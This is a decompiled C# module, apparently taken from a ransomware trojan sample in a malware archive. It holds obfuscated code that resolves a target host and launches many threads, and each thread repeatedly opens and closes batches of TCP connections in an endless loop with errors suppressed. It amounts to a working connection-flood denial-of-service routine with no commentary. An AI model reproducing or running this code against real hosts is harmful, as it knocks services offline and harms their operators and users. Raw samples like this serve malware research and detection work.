// Decompiled with JetBrains decompiler
// Type: 
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u0002
{
  private static ThreadStart[] \u0002;
  private static Thread[] \u0003;
  public static string \u0005;
  private static IPEndPoint \u0008;
  public static ushort \u0006;
  private static \u0002.\u0002[] bd;
  public static int bc;
  public static int P;

  public static void \u0002()
  {
    try
    {
      \u0002.\u0008 = new IPEndPoint(Dns.GetHostEntry(\u0002.\u0005).AddressList[0], (int) \u0002.\u0006);
    }
    catch
    {
      \u0002.\u0008 = new IPEndPoint(IPAddress.Parse(\u0002.\u0005), (int) \u0002.\u0006);
    }
    \u0002.\u0003 = new Thread[\u0002.P];
    \u0002.\u0002 = new ThreadStart[\u0002.P];
    \u0002.bd = new \u0002.\u0002[\u0002.P];
    for (int index = 0; index < \u0002.P; ++index)
    {
      \u0002.bd[index] = new \u0002.\u0002(\u0002.\u0008, \u0002.bc);
      \u0002.\u0002[index] = new ThreadStart(\u0002.bd[index].\u0002);
      \u0002.\u0003[index] = new Thread(\u0002.\u0002[index]);
      \u0002.\u0003[index].Start();
    }
  }

  public static void \u0003()
  {
    for (int index = 0; index < \u0002.P; ++index)
    {
      try
      {
        \u0002.\u0003[index].Suspend();
      }
      catch
      {
      }
    }
  }

  private sealed class \u0002
  {
    private IPEndPoint \u0002;
    private Socket[] \u0003;
    private int \u0005;

    public \u0002(IPEndPoint _param1, int _param2)
    {
      this.\u0002 = _param1;
      this.\u0005 = _param2;
    }

    private void \u0002(IAsyncResult _param1)
    {
    }

    public void \u0002()
    {
label_0:
      try
      {
        while (true)
        {
          this.\u0003 = new Socket[this.\u0005];
          for (int index = 0; index < this.\u0005; ++index)
          {
            this.\u0003[index] = new Socket(this.\u0002.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            this.\u0003[index].Blocking = false;
            AsyncCallback callback = new AsyncCallback(this.\u0002);
            this.\u0003[index].BeginConnect((EndPoint) this.\u0002, callback, (object) this.\u0003[index]);
          }
          Thread.Sleep(100);
          for (int index = 0; index < this.\u0005; ++index)
          {
            if (this.\u0003[index].Connected)
              this.\u0003[index].Disconnect(false);
            this.\u0003[index].Close();
            this.\u0003[index] = (Socket) null;
          }
          this.\u0003 = (Socket[]) null;
        }
      }
      catch
      {
        for (int index = 0; index < this.\u0005; ++index)
        {
          try
          {
            if (this.\u0003[index].Connected)
              this.\u0003[index].Disconnect(false);
            this.\u0003[index].Close();
            this.\u0003[index] = (Socket) null;
          }
          catch
          {
          }
        }
        goto label_0;
      }
    }
  }
}
